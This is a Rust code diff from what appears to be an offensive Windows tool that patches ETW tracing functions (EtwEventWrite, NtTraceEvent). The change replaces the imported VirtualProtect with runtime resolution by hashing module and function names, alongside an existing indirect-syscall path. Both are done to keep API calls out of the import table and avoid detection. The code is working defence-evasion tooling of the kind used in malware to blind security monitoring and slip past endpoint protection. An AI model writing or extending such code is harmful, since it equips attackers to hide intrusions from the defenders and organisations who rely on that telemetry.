@@ -45,11 +45,13 @@ static ORIG_NT_TRACE: AtomicU8 = AtomicU8::new(0);
 mod imp {
     use super::{ORIG_ETW_WRITE, ORIG_ETW_WRITE_EX, ORIG_NT_TRACE};
     use std::sync::atomic::Ordering;
-    use winapi::um::winnt::PAGE_EXECUTE_READWRITE;
+
+    /// PAGE_EXECUTE_READWRITE (0x40) — local constant to avoid winapi import.
+    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
 
     /// Change memory protection using NtProtectVirtualMemory via indirect
     /// syscall (avoids kernel32!VirtualProtect IAT entry).  Falls back to
-    /// VirtualProtect when the `direct-syscalls` feature is disabled.
+    /// pe_resolve'd VirtualProtect when the `direct-syscalls` feature is disabled.
     ///
     /// Parameters mirror VirtualProtect for call-site convenience.
     #[inline]
@@ -74,7 +76,30 @@ mod imp {
         }
         #[cfg(not(feature = "direct-syscalls"))]
         {
-            winapi::um::memoryapi::VirtualProtect(addr, size, new_protect, old_protect) != 0
+            // Resolve VirtualProtect from kernel32 at runtime to avoid IAT entry.
+            const fn hash_str_const(s: &[u8]) -> u32 {
+                let mut h: u32 = pe_resolve::SEED;
+                let mut i = 0;
+                while i < s.len() {
+                    h = h.wrapping_mul(31).wrapping_add(s[i] as u32);
+                    i += 1;
+                }
+                h
+            }
+            const HASH_VIRTUALPROTECT: u32 = hash_str_const(b"VirtualProtect\0");
+            type FnVirtualProtect = unsafe extern "system" fn(
+                *mut std::ffi::c_void, usize, u32, *mut u32,
+            ) -> i32;
+            let module = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) {
+                Some(m) => m,
+                None => return false,
+            };
+            let addr_fn = match pe_resolve::get_proc_address_by_hash(module, HASH_VIRTUALPROTECT) {
+                Some(a) => a,
+                None => return false,
+            };
+            let virtual_protect: FnVirtualProtect = std::mem::transmute(addr_fn);
+            virtual_protect(addr, size, new_protect, old_protect) != 0
         }
     }
 
